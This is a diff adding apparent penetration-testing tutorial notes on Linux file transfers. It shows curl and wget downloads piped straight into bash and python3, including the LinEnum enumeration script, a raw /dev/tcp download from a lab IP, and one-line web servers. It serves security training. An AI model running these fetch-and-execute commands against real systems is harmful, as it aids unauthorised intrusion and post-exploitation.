@@ -302,3 +302,58 @@ IyBDb3B5cmlnaHQgK
 ```
 
 # Linux File Transfers
+
+## Fileless Attacks Using Linux
+
+### Fileless Download with cURL
+
+```
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+
+### Fileless Download with wget
+
+```
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+## Download with Bash (/dev/tcp)
+
+There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
+
+### Connect to the Target Webserver
+
+```
+exec 3<>/dev/tcp/10.10.10.32/80
+```
+
+### HTTP GET Request
+
+```
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+```
+
+### Print the Response
+
+```
+cat <&3
+```
+
+### Linux - Creating a Web Server with PHP
+
+```
+php -S 0.0.0.0:8000
+```
+
+### Linux - Creating a Web Server with Ruby
+
+```
+ruby -run -ehttpd . -p8000
+```
+
+### Linux - Creating a Web Server with Python2.7
+
+```
+python2.7 -m SimpleHTTPServer
+```
+
